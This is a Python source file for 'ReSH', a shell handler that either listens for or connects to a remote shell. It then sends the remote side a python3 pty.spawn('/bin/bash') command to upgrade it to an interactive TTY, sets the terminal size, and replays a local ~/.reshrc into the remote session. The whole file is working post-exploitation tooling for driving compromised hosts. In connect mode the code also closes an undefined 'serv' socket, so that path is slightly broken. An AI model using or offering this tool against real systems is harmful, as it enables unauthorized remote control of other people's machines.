#!/usr/bin/python3

import os
import socket
import sys
import threading
import time
from optparse import OptionParser

try:
	import tty
	import termios
except:
	imported = False
else:
	imported = True


g_fd = None
g_old_set = None

def setTTY():
	fd = sys.stdin.fileno()
	oldSet = termios.tcgetattr(fd)
	# os.system('stty raw -echo')
	tty.setraw(0)
	return fd, oldSet

def resetTTY(fd, oldSet):
	termios.tcsetattr(fd, termios.TCSADRAIN, oldSet)

def recvLoop(sock):
	sock.settimeout(1.0)
	while True:
		data = None
		try:
			data = sock.recv(10000000)
		except socket.timeout:
			continue
		except OSError:
			break
		except Exception as e:
			print(e)
		if data == b'' or data == None:
			break
		data = data.decode(errors='ignore')
		cprint(data)
	sock.close()

def cprint(data):
	print(data, end='', flush=True)

def connect(host, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host, port))
	return sock

def bind(port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('', port))
	sock.listen(1)
	client, addr = sock.accept()
	print('{} <= {}'.format(client.getsockname()[0], addr[0]))
	return sock, client

def rc(sock):
	rc_path = os.path.expanduser('~') + '/.reshrc'
	if os.path.exists(rc_path):
		with open(rc_path, 'rb') as fd:
			sock.send(fd.read())

def generateCmdRow():
	size = os.get_terminal_size()
	return 'stty rows {} columns {}\n'.format(size.lines, size.columns).encode()

def choice(sock):
	cprint('\r\n')
	cprint('(1) Exit\r\n')
	cprint('(2) Resize Terminal\r\n')
	cprint('(3) Reload Reshrc\r\n')
	cprint('(4) Get IP\r\n')
	cprint('(5) Stop TTY\r\n')
	cprint('> ')
	chc = sys.stdin.read(1)
	if chc == '1':
		sock.send(b'exit\n')
	elif chc == '2':
		sock.send(generateCmdRow())
	elif chc == '3':
		rc(sock)
		sock.send(b'\n')
	elif chc == '4':
		print(sock.getsockname()[0], end='\r\n')
		sock.send(b'\n')
	elif chc == '5':
		if imported:
			global g_fd, g_old_set
			resetTTY(g_fd, g_old_set)
		print('\n')
	else:
		sock.send(b'\n')
	return chc

def parseOpt():
	parser = OptionParser(
		usage='\n' \
		 + '  %prog [options] [IP] [PORT]\n' \
		 + '  %prog [options] [PORT]')
	parser.add_option('-t', '--no-tty', dest='no_tty', action='store_true', default=False, help='No TTY')
	options, args = parser.parse_args()
	if len(args) < 1:
		parser.print_help()
		exit(1)
	else:
		print('Settings: Ctrl+s\r\nExit: ² or Ω\r\n')
	return options, args

header = '''
██████╗░███████╗░██████╗██╗░░██╗
██╔══██╗██╔════╝██╔════╝██║░░██║
██████╔╝█████╗░░╚█████╗░███████║
██╔══██╗██╔══╝░░░╚═══██╗██╔══██║
██║░░██║███████╗██████╔╝██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝
'''

def main():
	global g_fd, g_old_set
	print(header)

	option, args = parseOpt()
	if len(args) == 1:
		serv, sock = bind(int(args[0]))
	elif len(args) == 2:
		sock = connect(args[0], int(args[1]))
	else:
		exit(1)

	if not option.no_tty:
		sock.send(b'export TERM=xterm\n')
		sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
		cprint('\r\n')

		if imported:
			g_fd, g_old_set = setTTY()

	thr = threading.Thread(target=recvLoop, args=(sock,))
	thr.start()

	if not option.no_tty:
		time.sleep(1)
		sock.send(generateCmdRow())
	rc(sock)

	while True:
		try:
			c = sys.stdin.read(1)
		except KeyboardInterrupt:
			print('\r\nDo you want to exit? (y/N)\r\n', end='', flush=True)
			c = sys.stdin.read(1)
			if c == 'y':
				sock.send(b'exit\n')
				break
		except UnicodeDecodeError:
			pass
		if c == '\r':
			c = '\n'
		elif c == '²' or c == 'Ω':
			sock.send(b'exit\n')
			break
		elif c == '\x13': # Ctrl+s
			chc = choice(sock)
			if chc == '1':
				break
			c = ''
		try:
			sock.send(c.encode())
		except BrokenPipeError:
			break
		except OSError:
			print('\r\nOSError: Close ReSH\r')
			break
		except Exception as e:
			print(e)

	if not option.no_tty and imported:
		resetTTY(g_fd, g_old_set)
	sock.close()
	serv.close()
	thr.join()

if __name__ == '__main__':
	main()
